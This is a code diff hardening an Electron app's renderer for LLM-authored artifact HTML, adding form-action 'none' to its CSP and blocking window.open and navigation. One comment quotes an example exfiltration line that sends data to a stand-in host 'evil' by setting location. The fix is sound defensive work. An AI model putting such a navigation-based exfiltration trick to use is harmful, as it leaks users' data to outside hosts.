@@ -13,7 +13,12 @@ function vendorFileUrl(filename: string): string {
   return `file:///${VENDOR_DIR.replace(/\\/g, '/')}/${filename}`
 }
 
-const CSP = "default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:;"
+// JM-19 (SEC-8) — form-action 'none' closes the form-submit exfil channel
+// (connect-src doesn't cover navigations/submissions). Renderer-initiated
+// navigation is denied wholesale via will-navigate below — `navigate-to`
+// never shipped in Chromium, so the handler is the real control.
+const CSP =
+  "default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:; form-action 'none';"
 
 function buildHtmlDoc(type: string, content: string): string {
   switch (type) {
@@ -32,7 +37,7 @@ function buildHtmlDoc(type: string, content: string): string {
 
     case 'mermaid':
       return `<!DOCTYPE html><html><head>
-<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:;">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:; form-action 'none';">
 <style>body{margin:0;padding:16px;background:#1a1a2e;color:#e8e8e8;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 32px)}</style>
 </head><body>
 <pre class="mermaid">${content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
@@ -43,7 +48,7 @@ function buildHtmlDoc(type: string, content: string): string {
     case 'jsx': {
       const escaped = content.replace(/<\/script>/gi, '<\\/script>')
       return `<!DOCTYPE html><html><head>
-<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:;">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'self' data:; form-action 'none';">
 <style>body{margin:0;background:#1a1a2e;color:#e8e8e8;font-family:system-ui,sans-serif}#root{padding:16px}</style>
 </head><body>
 <div id="root"></div>
@@ -70,6 +75,16 @@ try {
 let view: WebContentsView | null = null
 let currentSource = ''
 let currentType = ''
+
+// JM-19 (SEC-8) — artifact HTML is LLM-authored, i.e. untrusted. connect-src
+// 'none' blocks fetch/XHR, but navigation was uncovered: content could still
+// exfiltrate itself via `location = 'https://evil/?' + data` or window.open.
+// Deny both wholesale — programmatic loadFile from the main process does not
+// emit will-navigate, so re-renders keep working.
+function lockDownArtifactContents(contents: Electron.WebContents): void {
+  contents.setWindowOpenHandler(() => ({ action: 'deny' }))
+  contents.on('will-navigate', (event) => event.preventDefault())
+}
 
 function getMainWindow(): BrowserWindow | null {
   const windows = BrowserWindow.getAllWindows()
@@ -98,6 +113,7 @@ export function render(type: string, content: string): void {
         webSecurity: true,
       },
     })
+    lockDownArtifactContents(view.webContents)
     win.contentView.addChildView(view)
   }
 
@@ -156,6 +172,7 @@ export function openInWindow(type: string, content: string): void {
       webSecurity: true,
     },
   })
+  lockDownArtifactContents(artifactWin.webContents)
   artifactWin.loadFile(tempPath)
 }
 
